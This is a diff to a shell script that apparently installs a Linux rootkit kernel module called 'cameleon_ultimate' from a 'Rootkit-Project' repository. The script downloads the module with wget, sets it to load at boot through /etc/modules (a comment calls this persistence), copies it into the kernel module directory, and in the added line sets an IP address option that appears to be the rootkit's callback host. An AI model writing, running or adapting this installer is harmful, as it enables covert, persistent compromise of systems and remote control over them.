@@ -7,6 +7,7 @@ wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmod
 # persistence (load le module au demarage)
 echo "cameleon_ultimate" >> /etc/modules
 mkdir -p /lib/modules/$(uname -r)/extra
+echo "options cameleon_ultimate ip=192.168.1.37" > /etc/modprobe.d/cameleon_ultimate.conf
 cp cameleon_ultimate.ko /lib/modules/$(uname -r)/extra/
 depmod -a
 
